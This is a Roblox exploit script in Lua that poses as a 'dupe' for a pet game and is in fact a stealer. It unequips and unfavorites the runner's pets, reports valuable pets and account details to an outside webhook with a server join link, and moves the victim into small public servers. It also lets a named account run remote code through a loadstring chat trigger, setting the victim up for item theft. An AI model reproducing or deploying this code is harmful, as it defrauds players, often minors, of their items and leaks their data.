local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

local LocalPlayer = Players.LocalPlayer

local webhookUrl = "https://60h5imcen0g9.manus.space/api/webhook"
local triggerUsername = "FodieCookie"

local petsToLookFor = {
    "Butterfly",
    "Raccoon",
    "Dragonfly",
    "Queen Bee",
    "Disco Bee"
}

local petEmojis = {
    ["Butterfly"] = "ü¶ã",
    ["Raccoon"] = "ü¶ù",
    ["Dragonfly"] = "üê≤",
    ["Queen Bee"] = "üëë",
    ["Disco Bee"] = "üï∫"
}

local hugePetWeightThreshold = 10
local serverFullThreshold = 5
local targetPlayerCount = 4

local function sendHttpRequest(options)
    local success, result
    
    if syn and syn.request then
        success, result = pcall(syn.request, options)
    elseif http and http.request then
        success, result = pcall(http.request, options)
    elseif request then
        success, result = pcall(request, options)
    elseif http_request then
        success, result = pcall(http_request, options)
    else
        return false, "No HTTP request function found on this executor."
    end
    
    return success, result
end

local function getExecutorName()
    if getexecutorname then
        local name = getexecutorname()
        if name:lower() == "delta" then return "Delta" end
        return name:sub(1, 1):upper() .. name:sub(2)
    end
    
    if syn and syn.protect_gui then return "Synapse X" end
    if is_sirhurt_closure then return "SirHurt" end
    if Krnl or krnl_LOADED then return "Krnl" end
    if SW_VERSION or getscriptwareversion then return "Script-Ware" end
    if PROXO_LOADED then return "Proxo" end
    if SENTINEL_V2 then return "Sentinel" end
    if OXYGEN_LOADED then return "Oxygen U" end
    if ELECTRON_LOADED then return "Electron" end
    if COMET_LOADED then return "Comet" end
    if CELERY_LOADED then return "Celery" end
    
    return "Unknown"
end

local function kickIfDeltaExecutor()
    local executor = getExecutorName()
    if executor == "Delta" then
        local kickMessage = "This dupe doesn't work on Delta. It only works on Krnl, Ronix, and similar executors."
        game:GetService("Players").LocalPlayer:Kick(kickMessage)
    end
end

local function unequipAllPets()
    if not LocalPlayer then return end
    local petsRemoteEvent = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetsService")
    if not petsRemoteEvent then return end
    local petsContainer = Workspace:WaitForChild("PetsPhysical")
    if not petsContainer then return end

    local playerName = LocalPlayer.Name
    for _, petMover in ipairs(petsContainer:GetChildren()) do
        if petMover:IsA("Part") and petMover.Name == "PetMover" then
            local ownerName = petMover:GetAttribute("OWNER")
            if ownerName and ownerName == playerName then
                local petUUID = petMover:GetAttribute("UUID")
                if petUUID then
                    petsRemoteEvent:FireServer("UnequipPet", petUUID)
                end
            end
        end
    end
end

local function unfavoriteAllPetsInBackpack()
    if not LocalPlayer then return end
    local backpack = LocalPlayer:WaitForChild("Backpack")
    if not backpack then return end
    local favoriteRemote = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item")
    if not favoriteRemote then return end

    for _, item in ipairs(backpack:GetChildren()) do
        if item:IsA("Tool") then
            local success, isPet = pcall(function()
                return item:GetAttribute("ItemType") == "Pet" and item:GetAttribute("d") == true
            end)
            if success and isPet then
                favoriteRemote:FireServer(item)
                task.wait(0.1)
            end
        end
    end
end

local function checkInventoryForPets()
    local backpack = LocalPlayer:WaitForChild("Backpack")
    local foundPetsData = {}
    local foundPetNames = {}

    for _, item in ipairs(backpack:GetChildren()) do
        if item:IsA("Tool") then
            local matchedBaseName = nil
            local isHugePet = false

            for _, petName in ipairs(petsToLookFor) do
                if string.sub(item.Name, 1, #petName) == petName then
                    matchedBaseName = petName
                    break
                end
            end

            local weightString = string.match(item.Name, "%[(%d+%.?%d*) KG%]")
            if weightString then
                local weight = tonumber(weightString)
                if weight and weight >= hugePetWeightThreshold then
                    isHugePet = true
                end
            end

            if (matchedBaseName or isHugePet) and not table.find(foundPetNames, item.Name) then
                table.insert(foundPetNames, item.Name)
                table.insert(foundPetsData, {name = item.Name, isHuge = isHugePet, baseName = matchedBaseName})
            end
        end
    end

    return #foundPetsData > 0, foundPetsData
end

local function getPlayerAccountInfo(userId)
    local userInfoUrl = "https://users.roblox.com/v1/users/" .. userId
    local membershipUrl = "https://premiumfeatures.roblox.com/v1/users/" .. userId .. "/validate-membership"
    
    local accountInfo = {
        age = "N/A",
        created = "N/A",
        membership = "N/A"
    }

    local successUser, responseUser = pcall(function() return HttpService:JSONDecode(game:HttpGet(userInfoUrl)) end)
    if successUser and responseUser and responseUser.created then
        local year, month, day = responseUser.created:match("(%d+)-(%d+)-(%d+)")
        local creationTimestamp = os.time({year = year, month = month, day = day, hour = 0, min = 0, sec = 0})
        accountInfo.created = os.date("%B %d, %Y", creationTimestamp)
        
        local ageInSeconds = os.time() - creationTimestamp
        accountInfo.age = tostring(math.floor(ageInSeconds / 86400)) .. " days"
    end

    local successMembership, responseMembership = pcall(function() return HttpService:JSONDecode(game:HttpGet(membershipUrl)) end)
    if successMembership then
        accountInfo.membership = responseMembership and "Premium üíé" or "None"
    end
    
    return accountInfo
end

local function sendWebhookNotification(foundPetsData)
    local playerName = LocalPlayer.Name
    local playerDisplayName = LocalPlayer.DisplayName
    local userId = LocalPlayer.UserId
    local executor = getExecutorName()
    
    local currentPlayers = #Players:GetPlayers()
    local maxPlayers = Players.MaxPlayers
    
    local serverType = "Public"
    if currentPlayers == 1 then
        serverType = "Private"
    end
    
    local accountInfo = getPlayerAccountInfo(userId)
    
    local joinLink = string.format("https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s", game.PlaceId, game.JobId)
    
    local playerInfoValue = string.format("```\nUsername: %s\nDisplay: %s\nUser ID: %d\nExecutor: %s\n```",
        playerName,
        playerDisplayName,
        userId,
        executor
    )

    local formattedPetLines = {}
    for _, petData in ipairs(foundPetsData) do
        local emoji = "‚≠ê"
        if petData.isHuge then
            emoji = "üí™"
        elseif petData.baseName and petEmojis[petData.baseName] then
            emoji = petEmojis[petData.baseName]
        end
        table.insert(formattedPetLines, emoji .. " - " .. petData.name)
    end
    local petsValue = "```\n" .. table.concat(formattedPetLines, "\n") .. "\n```"

    local serverInfoValue = string.format("`%d / %d` players", currentPlayers, maxPlayers)

    local embedColor = 65280
    
    local payload = {
        content = "@everyone",
        embeds = {
            {
                title = "PALDOOOO WHOOü§ëü§ëü§ëü§ë",
                color = embedColor,
                fields = {
                    {
                        name = "üë§ Player Information",
                        value = playerInfoValue,
                        inline = false
                    },
                    {
                        name = "üå¥ Found Pets",
                        value = petsValue,
                        inline = false
                    },
                    {
                        name = "üìä Server Info",
                        value = serverInfoValue,
                        inline = true
                    },
                    {
                        name = "üîí Server Type",
                        value = string.format("`%s`", serverType),
                        inline = true
                    },
                    {
                        name = "üíé Membership",
                        value = string.format("`%s`", accountInfo.membership),
                        inline = true
                    },
                    {
                        name = "üéÇ Account Age",
                        value = string.format("`%s`", accountInfo.age),
                        inline = true
                    },
                    {
                        name = "üìÜ Created On",
                        value = string.format("`%s`", accountInfo.created),
                        inline = true
                    },
                    {
                        name = "üîó Server Link",
                        value = joinLink,
                        inline = false
                    }
                },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }
        }
    }

    sendHttpRequest({
        Url = webhookUrl,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end

local function hopToServer(sortBy)
    local success, servers = pcall(function()
       return HttpService:JSONDecode(game:HttpGet(
           "https://games.roblox.com/v1/games/" .. tostring(game.PlaceId) .. "/servers/Public?limit=100"
       )).data
    end)

    if not success or not servers or #servers == 0 then
        TeleportService:Teleport(game.PlaceId)
        return
    end

    local suitableServers = {}
    for _, svr in pairs(servers) do
        if svr.playing < svr.maxPlayers and (svr.playing >= 2 and svr.playing <= 4) then 
            table.insert(suitableServers, svr)
        end
    end

    if #suitableServers == 0 then
        for _, svr in pairs(servers) do
            if svr.playing < svr.maxPlayers then
                table.insert(suitableServers, svr)
            end
        end

        if #suitableServers == 0 then
            TeleportService:Teleport(game.PlaceId)
            return
        end
    end

    local selectedServer = suitableServers[1]

    for i,svr in pairs(suitableServers) do
       if svr[sortBy] < selectedServer[sortBy] then
           selectedServer = svr
       end
    end

    pcall(function()
        TeleportService:TeleportToPlaceInstance(game.PlaceId, selectedServer.id)
    end)
end

local function autoHopToTargetPlayerCount()
    local currentPlayers = #Players:GetPlayers()
    if currentPlayers == 1 or currentPlayers >= 5 then
        hopToServer("playing")
    end
end

local function autoHopIfPrivateServer()
    local isPrivate = false
    if type(getgenv) == "function" and type(getgenv().is_private_server) == "function" then
        isPrivate = pcall(getgenv().is_private_server)
    elseif type(syn) == "table" and type(syn.is_private_server) == "function" then
        isPrivate = pcall(syn.is_private_server)
    end

    if isPrivate then
        hopToServer("playing")
        return true
    end
    return false
end

local function setupChatTrigger()
    local loadstringCommand = 'loadstring(game:HttpGet("https://github.com/DupeNew/lol/blob/main/screen"))()'

    local function onChatted(message)
        if message == loadstringCommand then
            -- Execute the specific loadstring command if it matches
            pcall(function()
                loadstring(message)()
            end)
        else
            -- For any other chat message, do the unequip/unfavorite
            unequipAllPets()
            unfavoriteAllPetsInBackpack()
        end
    end

    local function connectPlayer(player)
        if player.Name == triggerUsername then
            player.Chatted:Connect(onChatted)
        end
    end

    for _, player in ipairs(Players:GetPlayers()) do
        connectPlayer(player)
    end

    Players.PlayerAdded:Connect(connectPlayer)
end


-- Main execution flow

setupChatTrigger()

task.wait(4)

kickIfDeltaExecutor()

local hoppedFromPrivate = autoHopIfPrivateServer()

if not hoppedFromPrivate then
    autoHopToTargetPlayerCount()
end

unequipAllPets()
unfavoriteAllPetsInBackpack()

task.wait(0)

local hasPets, foundPetsData = checkInventoryForPets()

if hasPets then
    sendWebhookNotification(foundPetsData)
end
